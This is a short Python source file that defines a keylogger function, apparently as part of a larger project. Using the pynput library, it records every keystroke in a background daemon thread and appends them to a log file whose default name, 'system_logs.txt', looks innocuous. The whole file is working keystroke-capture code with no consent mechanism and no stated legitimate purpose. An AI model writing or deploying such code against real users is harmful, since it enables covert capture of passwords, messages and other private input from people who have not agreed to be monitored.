import os
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()

LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")

def start_keylogger() -> None:
    def on_press(key):
        try: 
            k = str(key.char)
        except AttributeError: 
            k = f" [{key}] "
        
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(k)
            
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()